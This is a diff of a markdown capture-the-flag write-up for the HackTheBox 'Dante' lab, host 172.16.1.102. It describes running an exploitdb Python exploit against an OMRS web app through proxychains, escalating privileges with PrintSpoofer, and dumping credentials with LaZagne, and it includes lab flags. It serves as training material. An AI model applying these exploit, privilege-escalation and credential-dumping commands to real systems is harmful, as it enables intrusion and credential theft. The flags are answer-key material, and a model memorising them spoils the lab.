@@ -1,14 +1,14 @@
 Host [172.16.1.102](http://172.16.1.102):
 
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.34.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.34.png)
 In checking the website, it is a marriage application site. In attempting to quickly submit an application after filling it out, I obtained the following results.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.39.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.39.png)
 
 In attempting to find more about what I may be able to use to login as the admin, I found the following when selecting on the "Admin" option from the homepage which should allow me to attempt a bruteforce attack on the password reset page with random numbers as the phone number or using password lists on the regular admin login screen.
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.40.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.40.png)
 
 I went ahead and checked online for this OMRS site. I immediately found an exploit on exploitdb that was a python script. It quickly allowed me to have a user account created as shown below with a set user and password.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.71.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.71.png)
 it also provided the following user:
 ```
 dante-ws03\blake
@@ -27,14 +27,14 @@ proxychains python3 exploit.py -u http://172.16.1.102:80/ -c 'C:\users\blake\Des
 ```
 
 Flag:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.72.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.72.png)
 
 ```
 DANTE{U_M4y_Kiss_Th3_Br1d3}
 ```
 
 From here, I started to check each folder in Blake's directory and I found an executable called PrintSpoofer64.exe in the Downloads folder. After quickly looking this up, I  found that you can easily escalate privileges to root "NT AUTH" using the following.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.73.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.73.png)
 
 ```
 PrintSpoofer64.exe -i -c cmd
@@ -45,7 +45,7 @@ Root flag:
 DANTE{D0nt_M3ss_With_MinatoTW}
 ```
 
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.74.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.74.png)
 
 I found a laz.exe which reminded me of the LaZagne project which gathers up all of the credentials on the Windows system. I ran it and obtained the following.:
 ```
